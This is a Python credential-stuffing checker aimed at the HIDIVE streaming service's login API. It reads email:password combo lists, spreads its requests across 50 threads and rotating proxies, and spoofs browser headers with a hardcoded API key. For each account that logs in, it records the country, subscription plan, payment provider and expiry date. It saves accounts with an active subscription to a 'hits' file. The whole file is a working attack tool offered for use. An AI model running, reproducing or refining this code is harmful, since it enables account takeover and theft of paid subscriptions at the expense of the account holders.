import requests
import threading
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- CONFIGURATION ---
COMBO_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
HITS_FILE = "Hidive hits.txt"
FREE_FILE = "free.txt"
THREADS = 50

stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
print_lock = threading.Lock()

# --- API KEYS (from SB config @XD_HR) ---
API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
APP_VAR = "6.58.0.a0c6b52"
BASE = "https://dce-frontoffice.imggaming.com"

# Retry on transient HTTP errors
_RETRY = Retry(
    total=2,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET", "POST"],
    raise_on_status=False,
)

def get_proxies():
    plist = []
    if not os.path.exists(PROXY_FILE): return [None]
    try:
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                p = line.split(':')
                if len(p) == 4:
                    plist.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
                else:
                    plist.append({"http": f"http://{line}", "https": f"http://{line}"})
        return plist if plist else [None]
    except: return [None]

def make_session():
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=_RETRY)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def make_headers():
    return {
        "Host": "dce-frontoffice.imggaming.com",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Realm": "dce.hidive",
        "x-app-var": APP_VAR,
        "Accept-Language": "en-US",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "app": "dice",
        "x-api-key": API_KEY,
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://www.hidive.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "Referer": "https://www.hidive.com/",
        "Accept-Encoding": "gzip, deflate, br",
    }


# ── Parsing helpers (match SB parse behaviour) ─────────────────────────

def find_json_value(obj, key):
    """Recursively find the first value for key in a JSON tree.
    Returns scalars and None; skips dicts/lists (searches deeper).
    """
    if isinstance(obj, dict):
        if key in obj:
            val = obj[key]
            if val is None or isinstance(val, (str, int, float, bool)):
                return val
        for v in obj.values():
            result = find_json_value(v, key)
            if result is not None:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = find_json_value(item, key)
            if result is not None:
                return result
    return None


def lr_parse(text, left, right):
    """Extract substring between left and right markers."""
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ""


def check(account, proxies):
    global stats
    try:
        email, password = account.split(":", 1)
    except ValueError:
        return

    session = make_session()
    proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
    headers = make_headers()

    try:
        # 1. LOGIN
        response = session.post(
            f"{BASE}/api/v2/login",
            json={"id": email, "secret": password},
            headers=headers, proxies=proxy, timeout=15
        )

        r1_text = response.text
        if "authorisationToken" not in r1_text:
            if "failedAuthentication" in r1_text or "NOT_FOUND" in r1_text or response.status_code == 401:
                with print_lock: stats["fail"] += 1
            else:
                with print_lock: stats["error"] += 1
            return

        try:
            token = response.json()["authorisationToken"]
        except (ValueError, KeyError):
            with print_lock: stats["error"] += 1
            return
        headers["Authorization"] = f"Bearer {token}"

        # 2. ADDRESS → Country (SB: PARSE JSON "countryCode" recursive)
        country = ""
        try:
            r_addr = session.get(f"{BASE}/api/v2/user/address", headers=headers, proxies=proxy, timeout=10)
            addr_data = r_addr.json()
            country = str(find_json_value(addr_data, "countryCode") or "")
        except: pass

        # 3. LICENCE-FAMILY → subscription
        sub_res = session.get(
            f"{BASE}/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
            headers=headers, proxies=proxy, timeout=10
        )

        sub_text = sub_res.text

        # Parse captures — direct path access first (most reliable)
        plan_name = ""
        plan_type = ""
        auto_renewal = ""
        payment_provider = ""
        account_status = ""
        expiry_date = "N/A"
        days_left = "0"

        data = None
        try:
            data = sub_res.json()
        except: pass

        families = []
        if isinstance(data, dict):
            families = data.get("licenceFamilies", [])

        if families and isinstance(families, list) and len(families) > 0:
            fam = families[0]
            if isinstance(fam, dict):
                plan_name = str(fam.get("name") or "")
                plan_type = str(fam.get("type") or "")
                auto_renewal = str(fam.get("paymentEventType") or "")
                account_status = str(fam.get("status") or "")
                ppi = fam.get("paymentProviderInfo")
                if isinstance(ppi, dict):
                    payment_provider = str(ppi.get("type") or "")
                expiry_ms = fam.get("expiryTimestamp")
                if expiry_ms and isinstance(expiry_ms, (int, float)) and expiry_ms > 0:
                    try:
                        dt = datetime.fromtimestamp(expiry_ms / 1000)
                        expiry_date = dt.strftime("%Y-%m-%d")
                        days_left = str(max(0, (dt - datetime.now()).days))
                    except: pass

        # Fallback: recursive JSON search
        if not account_status and data:
            val = find_json_value(data, "status")
            if val and isinstance(val, str):
                account_status = val
        if not plan_name and data:
            val = find_json_value(data, "name")
            if val:
                plan_name = str(val)

        # Fallback: LR parse for status
        if not account_status:
            chunk = lr_parse(sub_text, '"displayStyle":', '"paymentProviderInfo"')
            if chunk:
                account_status = lr_parse(chunk, '"status":"', '",')
                if not account_status:
                    account_status = lr_parse(chunk, '"status":"', '"')

        # Fallback: LR for payment provider
        if not payment_provider:
            payment_provider = lr_parse(sub_text, '"paymentProviderInfo":{"type":"', '"')

        # Fallback: LR for expiry
        if expiry_date == "N/A":
            expiry_raw = lr_parse(sub_text, '"expiryTimestamp":', ',')
            if expiry_raw:
                try:
                    ts = int(str(expiry_raw).strip().rstrip(',"'))
                    if ts > 0:
                        dt = datetime.fromtimestamp(ts / 1000)
                        expiry_date = dt.strftime("%Y-%m-%d")
                        days_left = str(max(0, (dt - datetime.now()).days))
                except: pass

        # KEYCHECK: exactly "ACTIVE" → HIT, else → FREE
        # NOTE: "INACTIVE" contains "ACTIVE" as substring, so use exact match
        if account_status.upper() == "ACTIVE":
            cap = (
                f"{email}:{password} | "
                f"Country = {country} | "
                f"Plan = {plan_name} | "
                f"Plan Type = {plan_type} | "
                f"Has Auto Renewal = {auto_renewal} | "
                f"Payment Provider = {payment_provider} | "
                f"Account Status = {account_status} | "
                f"Expiry Date = {expiry_date} | "
                f"Days Left = {days_left}"
            )
            with open(HITS_FILE, "a", encoding="utf-8") as f:
                f.write(cap + "\n")
            with print_lock:
                stats["hits"] += 1
                print(f"[\033[92mHIT\033[0m] {email} | {account_status} | {plan_name}")
        else:
            with open(FREE_FILE, "a") as f:
                f.write(f"{email}:{password}\n")
            with print_lock:
                stats["free"] += 1
                print(f"[\033[93mFREE\033[0m] {email}")

    except Exception:
        with print_lock: stats["error"] += 1
    finally:
        with print_lock:
            stats["checked"] += 1
            print(f"\r[*] Checked: {stats['checked']} | Hits: {stats['hits']} | Free: {stats['free']} | Fails: {stats['fail']}", end="")

def main():
    if not os.path.exists(COMBO_FILE):
        print(f"[!] Please put your accounts in {COMBO_FILE}")
        return

    proxies = get_proxies()
    with open(COMBO_FILE, "r") as f:
        accs = [l.strip() for l in f if ":" in l]

    print(f"[*] Starting: {len(accs)} Accounts | Threads: {THREADS}\n")

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for a in accs:
            ex.submit(check, a, proxies)

    print(f"\n\n[*] Done! Total Hits: {stats['hits']}")

if __name__ == "__main__":
    main()
